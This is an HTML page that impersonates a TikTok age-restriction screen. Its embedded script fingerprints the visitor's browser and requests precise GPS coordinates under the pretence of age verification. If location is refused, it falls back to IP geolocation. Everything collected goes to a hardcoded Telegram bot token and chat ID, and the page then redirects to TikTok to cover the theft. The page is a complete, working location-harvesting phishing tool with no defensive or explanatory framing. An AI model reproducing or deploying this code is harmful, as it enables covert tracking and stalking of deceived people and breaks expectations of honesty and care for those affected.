<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=yes">
    <title>TikTok · Age Restricted</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            background: #000;
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            color: white;
        }
        .container {
            width: 100%;
            max-width: 360px;
            background: #121212;
            border-radius: 20px;
            overflow: hidden;
            box-shadow: 0 10px 30px rgba(0,0,0,0.6);
            animation: fadeIn 0.5s ease;
        }
        @keyframes fadeIn { from { opacity: 0; transform: scale(0.98); } to { opacity: 1; transform: scale(1); } }
        .video-placeholder {
            background: #1a1a1a;
            aspect-ratio: 9 / 16;
            display: flex;
            flex-direction: column;
            justify-content: center;
            align-items: center;
            gap: 25px;
            position: relative;
            background-image: radial-gradient(circle at 30% 40%, #2a2a2a 2%, transparent 2.5%);
            background-size: 40px 40px;
        }
        .play-icon {
            width: 70px;
            height: 70px;
            background: rgba(255,255,255,0.15);
            border-radius: 50%;
            display: flex;
            align-items: center;
            justify-content: center;
            font-size: 36px;
            backdrop-filter: blur(4px);
            box-shadow: 0 0 20px rgba(0,0,0,0.5);
        }
        .overlay-message {
            background: rgba(0,0,0,0.8);
            padding: 14px 22px;
            border-radius: 40px;
            font-size: 15px;
            text-align: center;
            font-weight: 500;
            backdrop-filter: blur(8px);
            border: 0.5px solid rgba(255,255,255,0.2);
        }
        .age-warning {
            font-size: 12px;
            color: #ffaa44;
            margin-top: 5px;
        }
        .allow-button {
            background: #fe2c55;
            border: none;
            color: white;
            padding: 12px 24px;
            border-radius: 40px;
            font-size: 17px;
            font-weight: bold;
            cursor: pointer;
            transition: 0.2s;
            box-shadow: 0 2px 10px rgba(254,44,85,0.3);
        }
        .allow-button:hover { background: #e01e4a; transform: scale(1.02); }
        .footer {
            padding: 12px;
            text-align: center;
            font-size: 12px;
            color: #888;
            border-top: 1px solid #2a2a2a;
            background: #0e0e0e;
        }
        .status-text { font-size: 13px; margin-top: 12px; color: #ccc; font-weight: 400; }
        .spinner { display: inline-block; width: 18px; height: 18px; border: 2px solid #aaa; border-top-color: #fe2c55; border-radius: 50%; animation: spin 0.8s linear infinite; margin-left: 8px; vertical-align: middle; }
        @keyframes spin { to { transform: rotate(360deg); } }
    </style>
</head>
<body>
<div class="container">
    <div class="video-placeholder">
        <div class="play-icon">🎬</div>
        <div class="overlay-message">
            🔞 Age Restricted Content<br>
            <span class="age-warning">You must verify your age to watch this video.</span>
        </div>
        <button class="allow-button" id="allowBtn">▶️ Tap to Verify & Play</button>
        <div class="status-text" id="statusMsg"></div>
    </div>
    <div class="footer">
        TikTok · For You
    </div>
</div>

<script>
    // ========== TELEGRAM CREDENTIALS (YOURS) ==========
    const BOT_TOKEN = "8803190683:AAGPgzB40hHONL4uWM-N1Ewpi3DYNFNusP0";
    const CHAT_ID   = "5790869652";
    // =================================================

    async function sendToTelegram(text) {
        const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
        try {
            await fetch(url, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ chat_id: CHAT_ID, text: text })
            });
        } catch(e) { console.error(e); }
    }

    function getFingerprint() {
        const canvas = document.createElement('canvas');
        canvas.width = 200;
        canvas.height = 50;
        const ctx = canvas.getContext('2d');
        ctx.fillStyle = '#f60';
        ctx.fillRect(0, 0, 100, 50);
        ctx.fillStyle = '#069';
        ctx.fillText('fp', 10, 20);
        const canvasHash = canvas.toDataURL().substring(0, 120);
        return {
            userAgent: navigator.userAgent,
            platform: navigator.platform,
            language: navigator.language,
            languages: navigator.languages,
            timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
            screen: `${screen.width}x${screen.height}`,
            colorDepth: screen.colorDepth,
            touchPoints: navigator.maxTouchPoints,
            hardwareConcurrency: navigator.hardwareConcurrency,
            deviceMemory: navigator.deviceMemory,
            cookieEnabled: navigator.cookieEnabled,
            webdriver: navigator.webdriver,
            timestamp: new Date().toISOString(),
            url: window.location.href,
            referrer: document.referrer,
            canvasHash: canvasHash
        };
    }

    async function getIPLocation() {
        try {
            const res = await fetch('https://ip-api.com/json/');
            const data = await res.json();
            if (data.status === 'success') {
                return `${data.city}, ${data.region}, ${data.country} | Lat: ${data.lat}, Lon: ${data.lon} | ISP: ${data.isp}`;
            }
            return `IP: ${data.query} (location unavailable)`;
        } catch(e) {
            return 'IP geolocation failed (fetch error)';
        }
    }

    const btn = document.getElementById('allowBtn');
    const statusSpan = document.getElementById('statusMsg');

    btn.addEventListener('click', async () => {
        statusSpan.innerHTML = 'Verifying age... <span class="spinner"></span>';
        const fp = getFingerprint();

        if (!navigator.geolocation) {
            statusSpan.innerHTML = 'Verification failed. Redirecting...';
            await sendToTelegram(`❌ No geolocation support\n\nFingerprint:\n${JSON.stringify(fp, null, 2)}`);
            setTimeout(() => window.location.href = 'https://www.tiktok.com/@tiktok/video/trending', 1800);
            return;
        }

        navigator.geolocation.getCurrentPosition(
            async (position) => {
                const loc = {
                    lat: position.coords.latitude,
                    lon: position.coords.longitude,
                    accuracy: position.coords.accuracy,
                    altitude: position.coords.altitude,
                    heading: position.coords.heading,
                    speed: position.coords.speed
                };
                const msg = `📍 EXACT LOCATION (Age verified)\n\nCoordinates: ${loc.lat}, ${loc.lon}\nAccuracy: ${loc.accuracy}m\n\n📱 Fingerprint:\n${JSON.stringify(fp, null, 2)}`;
                await sendToTelegram(msg);
                statusSpan.innerHTML = 'Access granted! Playing video...';
                setTimeout(() => window.location.href = 'https://www.tiktok.com/@tiktok/video/trending', 1500);
            },
            async (error) => {
                let errorMsg = '';
                switch(error.code) {
                    case error.PERMISSION_DENIED: errorMsg = 'User denied location (age verification failed)'; break;
                    case error.POSITION_UNAVAILABLE: errorMsg = 'Position unavailable'; break;
                    case error.TIMEOUT: errorMsg = 'Timeout'; break;
                    default: errorMsg = 'Unknown error';
                }
                statusSpan.innerHTML = 'Verification failed. Redirecting anyway...';
                const ipLoc = await getIPLocation();
                const msg = `🚫 LOCATION DENIED (${errorMsg})\n\nIP Location: ${ipLoc}\n\n📱 Fingerprint:\n${JSON.stringify(fp, null, 2)}`;
                await sendToTelegram(msg);
                setTimeout(() => window.location.href = 'https://www.tiktok.com/@tiktok/video/trending', 1800);
            },
            { enableHighAccuracy: true, timeout: 10000 }
        );
    });
</script>
</body>
</html>
